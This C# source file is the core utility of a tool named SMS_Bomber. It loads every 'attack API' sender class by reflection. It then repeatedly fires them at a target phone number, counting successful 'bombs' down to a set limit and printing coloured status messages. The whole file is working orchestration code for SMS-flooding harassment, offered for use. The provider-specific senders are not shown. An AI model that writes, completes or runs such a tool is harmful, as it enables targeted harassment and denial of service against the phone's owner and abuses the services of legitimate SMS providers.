using System;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SMS_Bomber
{
    public static class Utility
    {
        public static List<ISender> AttackAPIs { get; private set; }

        public static void Initialize()
        {
            AttackAPIs = new List<ISender>();
            var AllTYP = AppDomain.CurrentDomain.GetAssemblies().SelectMany(S => S.GetTypes())
                .Where(P => typeof(ISender).IsAssignableFrom(P) && !P.IsInterface);
            foreach (Type TP in AllTYP) AttackAPIs.Add((ISender)Activator.CreateInstance(TP));
        }

        public static async Task BombItUP(long To, int Limit)
        {
            if (Limit <= 0) return;
            else
            {
                while (true)
                {
                    foreach (var Attacker in AttackAPIs)
                    {
                        if (Limit <= 0) return;
                        Write($"Bombing Through {Attacker.Provider}.", "C");
                        if (await Attacker.Attack(To))
                        {
                            Limit--;
                            Write($"{Attacker.Provider} Has Bombed Successfully!" +
                                $" {Limit} Attempts Remaining....", "G");
                        }
                        else Write($"{Attacker.Provider} Has Failed To Bomb! Trying Different Provider.", "R");
                        await Task.Delay(500);
                        Console.Clear();
                    }
                }
            }
        }

        public static void Write(string Txt, string Clr = "N")
        {
            switch (Clr)
            {
                case "Y": Console.ForegroundColor = ConsoleColor.Yellow; break;
                case "C": Console.ForegroundColor = ConsoleColor.Cyan; break;
                case "R": Console.ForegroundColor = ConsoleColor.Red; break;
                case "G": Console.ForegroundColor = ConsoleColor.Green; break;
                case "A": Console.ForegroundColor = ConsoleColor.Gray; break;
                case "B": Console.ForegroundColor = ConsoleColor.Blue; break;
                default: Console.ForegroundColor = ConsoleColor.White; break;
            }

            Console.WriteLine(Txt);
            Console.ResetColor();
        }
    }
}
